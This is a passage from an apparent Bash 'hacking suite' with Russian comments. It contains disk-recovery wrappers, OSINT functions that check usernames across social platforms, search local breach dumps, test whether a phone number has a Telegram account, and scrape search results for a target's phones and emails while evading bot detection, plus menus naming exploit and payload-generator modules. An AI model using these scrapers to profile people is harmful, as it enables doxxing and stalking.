    core_engine_ui "!" "Launching Partition Repair Engine..."
    core_engine_ui "i" "Instruction: [Analyze] -> [Quick Search] -> [Write] to fix tables."
    
    # Слой 2: Синхронизация [13] — пауза перед запуском интерактивной утилиты
    sleep 2
    
    # Слой 3: Прямое взаимодействие с оборудованием
    # Работает с TARGET_DEV, выбранным в run_storage_selector [27]
    sudo testdisk "$dev_path"

    core_engine_wait
}


run_foremost_logic() {
    # Слой 1: Валидация через Мозг [5]
    core_engine_validator "pkg" "foremost" "Foremost Carving Tool" || return

    # Слой 2: Подготовка стерильного сектора в LOOT [11]
    local rec_dir="${LOOT_DIR}/recovered_$(date +%s)"
    mkdir -p "$rec_dir"
    
    core_engine_ui "!" "Starting Deep Carving. RAW Sector Analysis initiated."
    core_engine_ui "i" "Output directory: $rec_dir"
    
    # Слой 3: Процесс извлечения (Сигнатуры: изображения, документы, архивы, бинарники)
    # Используем вербальный режим (-v) для мониторинга в реальном времени
    sudo foremost -v -t jpg,pdf,exe,zip,doc,png,mp4 -i "$dev_path" -o "$rec_dir"
    
    # Слой 4: Регистрация результатов в Сборщике трофеев [11]
    core_engine_loot "forensics" "Deep Carving complete for $dev_path. Results: $rec_dir"
    
    core_engine_ui "s" "Extraction complete. Data secured in Prime Loot."
    core_engine_wait
}


run_dd_logic() {
    # Слой 1: Подготовка файла-образа
    local img_file="${LOOT_DIR}/disk_backup_$(date +%s).img"
    
    core_engine_ui "!" "Creating binary image dump... CRITICAL: DO NOT UNPLUG DEVICE!"
    
    # Слой 2: Посекторное копирование через Глушитель [7]
    # bs=4M для ускорения, conv=noerror,sync для пропуска битых секторов
    # status=progress обеспечивает визуализацию процесса
    sudo dd if="$dev_path" of="$img_file" bs=4M status=progress conv=noerror,sync
    
    # Слой 3: Валидация результата
    if [[ -f "$img_file" ]]; then
        core_engine_ui "s" "Image secured: $(basename "$img_file")"
        core_engine_ui "i" "You can now run Foremost on this .img file for offline analysis."
        
        # Регистрация в Сборщике трофеев [11]
        core_engine_loot "storage" "Image dump created: $img_file from $dev_path"
    else
        core_engine_ui "e" "Dump failed. Check target storage permissions."
    fi
    
    core_engine_wait
}

# ==============================================================================
# @description: Нативный автономный модуль Nexus SocialScan (Поиск никнейма)
# ==============================================================================
run_osint_custom_socialscan() {
    core_engine_ui "h" "NEXUS CORE: MULTI-PLATFORM SOCIALSCAN"
    
    # Сброс буфера ввода stdin
    tcflush xtcin 2>/dev/null || true
    
    local default_target=""
    if [[ -n "$target_user" ]]; then
        default_target="$target_user"
        core_engine_ui "i" "Обнаружена активная цель в текущей сессии: $default_target"
    fi

    echo -n " [?] Укажите Никнейм для сканирования сетей [По умолчанию: $default_target]: "
    read -r scan_target < /dev/tty

    if [[ -z "$scan_target" && -n "$default_target" ]]; then
        scan_target="$default_target"
    fi

    if [[ -z "$scan_target" ]]; then
        core_engine_ui "e" "[-] Параметр поиска пуст. Укажите никнейм."
        core_engine_wait
        return 1
    fi

    # Очистка от мусора
    scan_target="${scan_target//@/}"
    scan_target=$(echo "$scan_target" | cut -d'?' -f1 | tr -d '[:space:]')

    core_engine_ui "i" "Запуск нативного сканирования для идентификатора: $scan_target"
    echo "--------------------------------------------------"

    mkdir -p ~/prime_loot
    local loot_file="$HOME/prime_loot/socialscan_${scan_target}.txt"
    
    echo "==================================================================" > "$loot_file"
    echo " NEXUS SOCIALSCAN REPORT FOR: $scan_target" >> "$loot_file"
    echo " TIMESTAMP: $(date +'%Y-%m-%d %H:%M:%S')" >> "$loot_file"
    echo "==================================================================" >> "$loot_file"

    # Список проверяемых URL-шаблонов
    local platforms=(
        "Telegram|https://t.me/"
        "Instagram|https://www.instagram.com/"
        "TikTok|https://www.tiktok.com/@"
        "X-Twitter|https://x.com/"
        "GitHub|https://github.com/"
        "Pinterest|https://www.pinterest.com/"
        "YouTube|https://www.youtube.com/@"
        "Reddit|https://www.reddit.com/user/"
    )

    local found_count=0
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    for platform in "${platforms[@]}"; do
        local name="${platform%%|*}"
        local base_url="${platform#*|}"
        local full_url="${base_url}${scan_target}"
        
        # Проверяем доступность аккаунта по HTTP-коду (быстрый HEAD-запрос)
        local http_code
        http_code=$(curl -s -o /dev/null -I -L -A "$user_agent" --connect-timeout 5 -w "%{http_code}" "$full_url")
        
        if [[ "$http_code" == "200" ]]; then
            core_engine_ui "s" "[+] НАЙДЕН АККАУНТ ($name): $full_url"
            echo "Found_Platform: $name -> $full_url" >> "$loot_file"
            ((found_count++))
        elif [[ "$http_code" == "404" ]]; then
            echo " [.] $name: Профиль отсутствует (404)"
        else
            echo " [-] $name: Ограничено защитой площадки (HTTP $http_code)"
        fi
        
        sleep 0.5
    done

    echo "--------------------------------------------------"
    if (( found_count > 0 )); then
        core_engine_ui "s" "Сканирование завершено. Найдено совпадений: $found_count"
        core_engine_ui "s" "Результаты сохранены: $loot_file"
    else
        core_engine_ui "i" "Никнейм полностью свободен на основных платформах."
    fi
    
    core_engine_wait
}


# ==============================================================================
# @description: Нативный автономный модуль Nexus Breach Leaks (Локальный поиск)
# ==============================================================================
run_osint_custom_leaks() {
    core_engine_ui "h" "NEXUS CORE: LOCAL BREACH LEAKS SCANNER"
    
    # Сброс буфера ввода stdin
    tcflush xtcin 2>/dev/null || true
    
    local default_target=""
    if [[ -n "$target_user" ]]; then
        default_target="$target_user"
        core_engine_ui "i" "Обнаружена активная цель в текущей сессии: $default_target"
    fi

    echo -n " [?] Введите Email, Телефон или Никнейм для поиска по базам [По умолчанию: $default_target]: "
    read -r leak_target < /dev/tty

    if [[ -z "$leak_target" && -n "$default_target" ]]; then
        leak_target="$default_target"
    fi

    if [[ -z "$leak_target" ]]; then
        core_engine_ui "e" "[-] Ошибка: Не указан объект для локального анализа."
        core_engine_wait
        return 1
    fi

    local clean_target
    clean_target=$(echo "$leak_target" | tr -d '[:space:]')

    core_engine_ui "i" "Запуск высокоскоростного сигнатурного поиска по локальным хранилищам..."
    echo "--------------------------------------------------"

    # Директории, где скрипт будет искать текстовые дампы (.txt, .log, .csv)
    local search_dirs=("$HOME/arsenal_loot" "$HOME/prime_loot" "$HOME/reports")
    local match_count=0

    # Создаем или очищаем файл системного отчета о совпадениях
    local leak_report="$HOME/prime_loot/local_leaks_matches_${clean_target}.txt"
    echo "=== NEXUS LOCAL BREACH SEARCH REPORT FOR: $clean_target ===" > "$leak_report"
    echo "DATE: $(date +'%Y-%m-%d %H:%M:%S')" >> "$leak_report"
    echo "--------------------------------------------------" >> "$leak_report"

    for dir in "${search_dirs[@]}"; do
        if [[ -d "$dir" ]]; then
            core_engine_ui "i" "Анализ сектора: $dir..."
            
            # Ищем совпадения без учета регистра во всех текстовых файлах директории
            # Отсекаем сам файл отчета, чтобы не искать внутри себя
            local results
            results=$(grep -rih "$clean_target" "$dir" 2>/dev/null | grep -v "LOCAL BREACH SEARCH REPORT" | head -n 50)
            
            if [[ -n "$results" ]]; then
                while read -r line; do
                    if [[ -n "$line" ]]; then
                        core_engine_ui "s" "[!] НАЙДЕНО СОВПАДЕНИЕ В БАЗЕ: $line"
                        echo "$line" >> "$leak_report"
                        ((match_count++))
                    fi
                done <<< "$results"
            fi
        fi
    done

    echo "--------------------------------------------------"
    if (( match_count > 0 )); then
        core_engine_ui "s" "Поиск завершен. Обнаружено строк в дампах: $match_count"
        core_engine_ui "s" "Все найденные строки логов выгружены в: $leak_report"
    else
        core_engine_ui "i" "В локальных базах данных `~/arsenal_loot` совпадений с вектором не найдено."
    fi

    core_engine_wait
}

# ==============================================================================
# @description: Проверка привязки номера телефона к мессенджеру Telegram.
# @param: $1 - Номер телефона в международном формате
# ==============================================================================
run_osint_custom_ignorant() {
    local phone="$1"
    phone="${phone//+/}"
    phone="${phone// /}"
    phone="${phone//-/}"

    if [[ -z "$phone" || ! "$phone" =~ ^[0-9]+$ ]]; then
        core_engine_ui "e" "Неверный формат номера телефона."
        return 1
    fi

    core_engine_ui "h" "NEXUS OSINT: TELEGRAM INTERNAL RESOLVER"
    core_engine_ui "i" "Анализ сигнатуры телефонного пула: +$phone"
    echo "--------------------------------------------------"

    local tg_url="https://t.me/+$phone"
    local check_response
    check_response=$(curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --connect-timeout 5 "$tg_url")

    if [[ "$check_response" =~ "tg://resolve?phone" || "$check_response" =~ "Послать сообщение" || "$check_response" =~ "Send Message" ]]; then
        core_engine_ui "s" "[+] ВЕКТОР НАЙДЕН: Данный номер телефона привязан к Telegram аккаунту."
        echo "Telegram_Artifact: +$phone|STATUS:ACTIVE_ACCOUNT" >> ~/prime_loot/nexus_telegram_resolved.txt
        
        local meta_name
        meta_name=$(echo "$check_response" | grep -oE '<meta property="og:title" content="[^"]+"' | cut -d'"' -f4)
        if [[ -n "$meta_name" && "$meta_name" != "Telegram" ]]; then
            core_engine_ui "s" " -> Публичное имя в профиле: $meta_name"
            echo "Telegram_Meta: +$phone|NAME:$meta_name" >> ~/prime_loot/nexus_telegram_resolved.txt
        fi
    else
        core_engine_ui "i" "[-] Номер +$phone не зарегистрирован в мессенджере или полностью скрыт настройками приватности."
    fi

    echo "--------------------------------------------------"
    core_engine_wait
}

# ==============================================================================
# @description: Универсальный краулер v14.3 с глубоким поисковым шлюзом Google
# ==============================================================================
run_osint_omni_crawler() {
    core_engine_ui "h" "NEXUS CORE: OMNI STEALTH HEURISTIC CRAWLER v14.3"
    echo -n " [?] Введите Никнейм или любую ссылку (FB, Insta, TikTok, X, YT): "
    read -r user_input

    if [[ -z "$user_input" ]]; then
        core_engine_ui "e" "Критерий поиска пуст. Отмена сессии."
        core_engine_wait
        return 1
    fi

    local target_user=""
    local detected_platform="Generic_OSINT"
    local resolved_url=""

    # --- БЛОК 1: УНИВЕРСАЛЬНЫЙ RESOLVER ---
    if [[ "$user_input" =~ "facebook.com/share/" || "$user_input" =~ "fb.watch" || "$user_input" =~ "vt.tiktok.com" || "$user_input" =~ "instagram.com/share" || "$user_input" =~ "t.co/" || "$user_input" =~ "youtu.be/" ]]; then
        core_engine_ui "i" "Обнаружен короткий редирект. Перехват конечной точки..."
        resolved_url=$(curl -s -I -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --connect-timeout 6 "$user_input" | grep -i "^location:" | tail -n 1 | awk '{print $2}' | tr -d '\r')
        if [[ -n "$resolved_url" ]]; then
            user_input="$resolved_url"
            core_engine_ui "s" "[+] Ссылка успешно раскрыта"
        fi
    fi

    # --- БЛОК 2: ИДЕНТИФИКАЦИЯ МАТРИЦЫ ---
    if [[ "$user_input" =~ facebook.com/ ]]; then
        detected_platform="Facebook"
        if [[ "$user_input" =~ profile.php\?id=([0-9]+) ]]; then
            target_user="${BASH_REMATCH[1]}"
        else
            target_user=$(echo "$user_input" | grep -oE "facebook.com/[a-zA-Z0-9.]+" | cut -d'/' -f2)
        fi
    elif [[ "$user_input" =~ instagram.com/ ]]; then
        detected_platform="Instagram"
        target_user=$(echo "$user_input" | grep -oE "instagram.com/[a-zA-Z0-9._]+" | cut -d'/' -f2)
    elif [[ "$user_input" =~ tiktok.com/ ]]; then
        detected_platform="TikTok"
        target_user=$(echo "$user_input" | grep -oE "tiktok.com/@[a-zA-Z0-9._]+" | cut -d'/' -f2 | tr -d '@')
    elif [[ "$user_input" =~ x.com/ || "$user_input" =~ twitter.com/ ]]; then
        detected_platform="X_Twitter"
        target_user=$(echo "$user_input" | grep -oE "(x|twitter).com/[a-zA-Z0-9._]+" | cut -d'/' -f2)
    else
        target_user="${user_input//@/}"
        target_user="${target_user// /}"
        target_user=$(echo "$target_user" | cut -d'?' -f1)
    fi

    if [[ -z "$target_user" || "$target_user" == "share" || "$target_user" == "p" ]]; then
        core_engine_ui "e" "Не удалось изолировать чистый идентификатор цели."
        core_engine_wait
        return 1
    fi

    core_engine_ui "s" "[+] Матрица: $detected_platform | Идентификатор: $target_user"
    core_engine_ui "i" "Запуск глубокого пассивного сканирования глобального индекса..."
    echo "--------------------------------------------------"

    mkdir -p ~/prime_loot
    local loot_file="$HOME/prime_loot/omni_heuristic_${target_user}.txt"
    
    echo "==================================================================" > "$loot_file"
    echo " NEXUS SYSTEMS v14.3 - GLOBAL INDEX OSINT REPORT" >> "$loot_file"
    echo " TARGET: $target_user ($detected_platform)" >> "$loot_file"
    echo " TIMESTAMP: $(date +'%Y-%m-%d %H:%M:%S')" >> "$loot_file"
    echo "==================================================================" >> "$loot_file"

    # Набор семантических векторов для глобального текстового шлюза
    local query_vectors=(
        "${target_user}+phone"
        "${target_user}+contact"
        "${target_user}+gmail"
        "site:facebook.com+${target_user}"
    )

    local total_phones=0
    local total_emails=0
    local total_relations=0
    
    # Ротация продвинутых User-Agent для пробития защиты поисковых систем
    local user_agents=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
        "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
    )

    for vector in "${query_vectors[@]}"; do
        local rand_ua="${user_agents[$((RANDOM % ${#user_agents[@]}))]}"
        
        # Используем текстовое зеркало Google (без скриптов, чистое извлечение сырых данных)
        local request_url="https://www.google.com/search?q=${vector}&num=30&gbv=1-A"
        local raw_snippet_data
        raw_snippet_data=$(curl -s -A "$rand_ua" --connect-timeout 8 "$request_url")

        if [[ -z "$raw_snippet_data" || "$raw_snippet_data" =~ "detected unusual traffic" ]]; then
            # Если основной шлюз выдал капчу, плавно откатываемся на резервный текстовый шлюз
            request_url="https://html.duckduckgo.com/html/?q=${vector//+/ }"
            raw_snippet_data=$(curl -s -A "$rand_ua" --connect-timeout 8 "$request_url")
        fi

        if [[ -z "$raw_snippet_data" ]]; then continue; fi

        # --- ПАРСИНГ АРТЕФАКТОВ ---
        # 1. Извлечение мобильных номеров (поддержка пробелов, скобок и международных кодов)
        local extracted_phones
        extracted_phones=$(echo "$raw_snippet_data" | grep -oE "\+[0-9]{1,4}[ .-]?\(?[0-9]{2,4}\)?[ .-]?[0-9]{2,4}[ .-]?[0-9]{2,4}" | sort -u)
        if [[ -n "$extracted_phones" ]]; then
            while read -r phone; do
                if [[ -n "$phone" && ! "$phone" =~ "0000" && ${#phone} -gt 7 ]]; then
                    core_engine_ui "s" "[+] НАЙДЕН ТЕЛЕФОН: $phone"
                    echo "Extracted_Phone: $phone" >> "$loot_file"
                    ((total_phones++))
                fi
            done <<< "$extracted_phones"
        fi

        # 2. Извлечение электронных адресов
        local extracted_emails
        extracted_emails=$(echo "$raw_snippet_data" | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}" | grep -vE "google|duckduckgo|w3.org" | sort -u)
        if [[ -n "$extracted_emails" ]]; then
            while read -r email; do
                core_engine_ui "s" "[+] НАЙДЕН EMAIL: $email"
                echo "Extracted_Email: $email" >> "$loot_file"
                ((total_emails++))
            done <<< "$extracted_emails"
        fi

        # 3. Извлечение перекрестных связей
        local extracted_profiles
        extracted_profiles=$(echo "$raw_snippet_data" | grep -oE "(facebook|instagram|x|twitter|tiktok).com/[a-zA-Z0-9._]+" | grep -vE "search|html|privacy|help|login|accounts|$target_user" | sort -u)
        if [[ -n "$extracted_profiles" ]]; then
            while read -r profile; do
                core_engine_ui "w" " -> Выявлена связь: https://$profile"
                echo "Cross_Platform_Relation: https://$profile" >> "$loot_file"
                ((total_relations++))
            done <<< "$extracted_profiles"
        fi

        # Асинхронная задержка для сохранения полной тишины
        sleep $((2 + RANDOM % 3))
    done

    echo "--------------------------------------------------"
    if (( total_phones > 0 || total_emails > 0 || total_relations > 0 )); then
        core_engine_ui "s" "Глубокий анализ завершен! Сформировано зацепок: $((total_phones + total_emails + total_relations))"
        core_engine_ui "s" "Все артефакты экспортированы в лут-файл: $loot_file"
    else
        core_engine_ui "i" "Прямых открытых привязок в глобальном поисковом индексе на данный момент нет."
    fi

    core_engine_wait
}





# ==========================================
# 3. ОСНОВНОЙ ЦИКЛ (CORE LOOP)
# ==========================================
# --- Точка входа ---


# --- ГЛАВНОЕ МЕНЮ (ПОЛНЫЙ КОМПЛЕКТ v13.8) ---

menu_intelligence() {
    core_engine_ui "h" "SECTOR I: INTELLIGENCE & OSINT"
    local names="Smart_OSINT_Engine Network_Intelligence Nexus_SocialScan Nexus_Breach_Leaks Telegram_Resolver Omni_Stealth_Crawler"
    local funcs="run_smart_osint_engine  run_network_analyzer run_osint_custom_socialscan run_osint_custom_leaks run_osint_custom_ignorant run_osint_omni_crawler"
    prime_dynamic_controller "INTELLIGENCE" "$names" "$funcs"
}

menu_system_core() {
    core_engine_ui "h" "SYSTEM CORE: MAINTENANCE & INFO"
    local names="System_Info Sync_DNS Update_OS Update_Launcher Clean_Logs System_Pulse"
    local funcs="run_system_info core_network_dns_sync run_sys_update run_update_prime run_logs_cleaner run_system_pulse"
    prime_dynamic_controller "SYSTEM_CORE" "$names" "$funcs"
}

menu_forensics() {
    core_engine_ui "h" "SECTOR F: DATA FORENSICS & RECOVERY"
    local names="ADAPTIVE_ANALYZE Disk_Raw_Recovery Document_Sanitizer Forensic_Loot"
    local funcs="run_auto_forensics run_raw_recovery run_doc_cleaner run_loot_viewer"
    prime_dynamic_controller "DATA_FORENSICS" "$names" "$funcs"
}

menu_cyber_ops() {
    core_engine_ui "h" "CYBER OPERATIONS SECTOR"
    local names="Ghost_Commander PC_Control Ultimate_Exploit Omega_Auditor Polymorph_Gen"
    local funcs="run_ghost_commander pc_password_recovery run_prime_exploiter_v5  run_prime_auditor_v2 generate_poly_payload"
    prime_dynamic_controller "CYBER_OPS" "$names" "$funcs"
}

menu_crypto_lab() {
    core_engine_ui "h" "SECTOR C: CRYPTOGRAPHY & STEGANOGRAPHY"
    local names="Hash_Analyzer File_Encryptor Stegano_Deep_Hide SSH_Key_Gen"
    local funcs="run_hash_analyzer run_file_cryptor run_stegano_lab run_ssh_keygen"
    prime_dynamic_controller "CRYPTO_LAB" "$names" "$funcs"
}

menu_net_infra() {
    core_engine_ui "h" "NETWORK INFRASTRUCTURE"
    local names="Device_Hack Mesh_Bridge Server_Control Phantom_Engine"
    local funcs="run_device_hack run_mesh_bridge run_servers run_phantom_engine"
    prime_dynamic_controller "NET_INFRA" "$names" "$funcs"
}

menu_core_lab() {
    core_engine_ui "h" "CORE RESEARCH LAB"
    local names="Mem_Injection Packet_Forge WiFi_Pulse Kernel_Audit"
    local funcs="run_mem_inject run_packet_forge run_wifi_pulse run_kernel_check"
    prime_dynamic_controller "CORE_LAB" "$names" "$funcs"
}

menu_financial_shield() {
    core_engine_ui "h" "FINANCIAL SHIELD: BANKING GAMBIT"
    local names="IBAN_Validator Gambit_Strategy Transaction_Audit Secure_Wallet"
    local funcs="run_iban_analyzer run_gambit_info run_trans_audit run_wallet_manager"
    prime_dynamic_controller "FIN_SHIELD" "$names" "$funcs"
}


menu_stealth_comms() {
    # 1. Запуск прогресс-бара для красоты перехода
    core_engine_progress 1 "STEALTH_COMMS"    
    # 2. Имена для отображения в меню (красивые)
    local names="Live_Node_AV Shared_Node_Store Upload_Portal Node_Destroy"    
    # 3. РЕАЛЬНЫЕ имена функций из твоего кода (исправлено)
    local funcs="run_av_server run_share_server run_upload_server run_node_clean"    
    # 4. Запуск через контроллер
    prime_dynamic_controller "STEALTH_COMMS" "$names" "$funcs"
}

menu_nexus_correlation() {
    core_engine_ui "h" "SECTOR N: NEXUS ANALYSIS & CORRELATION"
    
    # Имена для отображения
    local names="Full_Pipeline"
local funcs="run_nexus_full_pipeline"    
    prime_dynamic_controller "NEXUS_CORRELATION" "$names" "$funcs"
}


run_main_menu() {
    local main_names="CYBER_OPS INTELLIGENCE CRYPTO_LAB NET_INFRA FIN_SHIELD STEALTH_COMMS 
NEXUS_CORRELATION SYSTEM_CORE CORE_LAB DATA_FORENSICS PASSWORD EXIT"
    local main_funcs="menu_cyber_ops menu_intelligence menu_crypto_lab menu_net_infra menu_financial_shield menu_stealth_comms menu_nexus_correlation menu_system_core menu_core_lab menu_forensics run_pass_lab exit_script"
    
    prime_dynamic_controller "PRIME MASTER EXECUTIVE" "$main_names" "$main_funcs"
}


# --- ТОЧКА ЗАПУСКА ---
clear
run_main_menu
